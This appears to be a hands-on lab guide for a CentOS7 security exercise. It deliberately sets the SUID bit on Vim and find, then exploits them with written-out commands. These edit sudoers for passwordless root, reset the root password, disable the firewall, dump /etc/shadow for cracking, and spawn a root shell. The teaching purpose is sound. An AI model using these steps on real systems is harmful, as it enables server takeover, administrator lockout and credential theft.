Some servers may be configured in a way that grants administrative privileges to programs that could be exploited.
Deliberately configure the Vim text editor that will allow security breaches, and then test to see how this configuration can be exploited.
Use elevated privileges to reset the password of the root user, restart a service, disable the firewall, and access password hashes.
Grant administrative privileges to the find command, and then exploit the administrative privileges by running commands as the root user, and then accessing password hashes.

On CentOS7-A:
- Create a security vulnerability by granting administrative privileges to Vim
To find programs that execute with administrative privileges: find / -perm -u=s -type f 2>/dev/null

To view the /etc/shadow file: cat /etc/shadow
* The /etc/shadow file is the storage location for the encrypted user account passwords. Only the system administrator can view the file contents.
An access denied message is received as we are currently signed in using an account that does not have administrative privileges.

Switch to the root user: su - root

To configure Vim to run with administrative privileges (Users who run the Vim text editor): chmod u+s /usr/bin/vim
chmod u+s /bin/vim

Enter exit to return to user01.

To find programs that run with administrative privileges, and to include a search for Vim: find / -perm -u=s -type f 2>/dev/null | grep vim


- Exploit the root privilege granted to Vim
To open the /etc/sudoers file by using the Vim text editor: vim /etc/sudoers
This file allows for the delegation of administrative privileges. The entry made now delegates access to all commands on the system, like the system administrator(root user).
Press Shift G to move to the end of the file and press i.

%user01 ALL=(ALL) NOPASSWD:ALL

Press Esc and then type :wq! Enter

All system administrator privileges have now been delegated to the user01. This exploits the security vulnerability created when vim was configured in the first activity, granting it the ability to run with the system administrator credentials.


- Use elevated privileges to take control of a server
To reset the password: sudo passwd root
This will lock the legitimate system administrator out of the server.

To restart the sshd service: sudo systemctl restart sshd

To stop, and then disable the firewall: sudo systemctl stop firewalld
sudo systemctl disable firewalld

To view the encrypted passwords stored in the /etc/shadow file: sudo cat /etc/shadow
This would allow you to copy the encrypted passwords into a password cracking program like John the Ripper.

To access a command prompt that has root privileges: sudo vim file.txt
:set shell=/bin/bash
:shell
Any command run at this command prompt runs with the root user's authority.

Enter exit, and then in Vim, press :q! and Enter to return to the user01 account.
Vim provides this warning to indicate you have attempted to edit a read-only file.


- Create a security vulnerability by configuring the find command
To get root privileges, and then when prompted: su - root

To configure the find command to run using administrative privileges: chmod u+s /bin/find
This creates a security vulnerability that allows to run the find command with the root administrator privileges. The find command can run a command after the search completes.
In this case, that command executes using root privileges.

Enter exit to switch back to the user01 account.

touch file.txt

Verify root privileges: find file.txt -exec whoami \;

To exploit the encrypted passwords on the system: find /etc/shadow -exec cat /etc/shadow \;
Observe the encrypted passwords in the /etc/shadow file. This technique would allow you to copy the encrypted passwords into a password cracking program.
